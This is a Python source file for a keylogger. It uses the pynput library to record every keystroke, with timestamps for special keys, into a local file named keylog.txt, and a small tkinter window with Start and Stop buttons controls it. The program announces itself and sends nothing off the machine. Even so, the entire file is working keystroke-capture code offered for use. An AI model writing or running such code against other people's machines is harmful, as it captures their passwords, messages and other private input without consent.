import datetime
import os
import tkinter as tk
from tkinter import messagebox
from threading import Thread
from pynput import keyboard

SPECIAL_KEYS = {
    keyboard.Key.alt: '[Alt]',
    keyboard.Key.ctrl: '[Ctrl]',
    keyboard.Key.shift: '[Shift]',
    keyboard.Key.enter: '[Enter]',
    keyboard.Key.backspace: '[Backspace]',
    keyboard.Key.tab: '[Tab]',
    keyboard.Key.up: '[Up]',
    keyboard.Key.down: '[Down]',
    keyboard.Key.left: '[Left]',
    keyboard.Key.right: '[Right]',
    keyboard.Key.page_up: '[Page Up]',
    keyboard.Key.page_down: '[Page Down]',
    keyboard.Key.home: '[Home]',
    keyboard.Key.end: '[End]',
    keyboard.Key.insert: '[Insert]',
    keyboard.Key.num_lock: '[Num Lock]',
    keyboard.Key.print_screen: '[Print Screen]',
    keyboard.Key.pause: '[Pause]',
    keyboard.Key.menu: '[Menu]',
    keyboard.Key.scroll_lock: '[Scroll Lock]',
    keyboard.Key.f1: '[F1]',
    keyboard.Key.f2: '[F2]',
    keyboard.Key.f3: '[F3]',
    keyboard.Key.f4: '[F4]',
    keyboard.Key.f5: '[F5]',
    keyboard.Key.f6: '[F6]',
    keyboard.Key.f7: '[F7]',
    keyboard.Key.f8: '[F8]',
    keyboard.Key.f9: '[F9]',
    keyboard.Key.f10: '[F10]',
    keyboard.Key.f11: '[F11]',
    keyboard.Key.f12: '[F12]',
    keyboard.Key.media_next: '[Media Next]',
    keyboard.Key.media_previous: '[Media Previous]',
    keyboard.Key.media_play_pause: '[Media Play/Pause]',
}

keylogger_active = False
listener = None

def on_key_press(key):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("keylog.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            if key == keyboard.Key.esc:
                print("Keylogger stopped.")
                return False
            elif key in SPECIAL_KEYS:
                logkey.write(f"\n{current_time} {SPECIAL_KEYS[key]} \n")
            elif key == keyboard.Key.space:
                logkey.write(" ")
            elif key == keyboard.Key.caps_lock:
                logkey.write(" [Caps Lock] ")
            elif key == keyboard.Key.tab:
                logkey.write(" [Tab] ")

def start_keylogger():
    global keylogger_active, listener
    if not keylogger_active:
        keylogger_active = True
        listener = keyboard.Listener(on_press=on_key_press)
        listener.start()
        print("Keylogger started. Press Esc to stop.")
        messagebox.showinfo("Info", "Keylogger started. Press Esc to stop.")

def stop_keylogger():
    global keylogger_active, listener
    if keylogger_active:
        keylogger_active = False
        if listener is not None:
            listener.stop()
            listener = None
        print("Keylogger stopped.")
        messagebox.showinfo("Info", "Keylogger stopped.")

# Create the main application window
app = tk.Tk()
app.title("Keylogger")

start_button = tk.Button(app, text="Start Keylogger", command=start_keylogger)
start_button.pack(pady=10)

stop_button = tk.Button(app, text="Stop Keylogger", command=stop_keylogger)
stop_button.pack(pady=10)

app.mainloop()
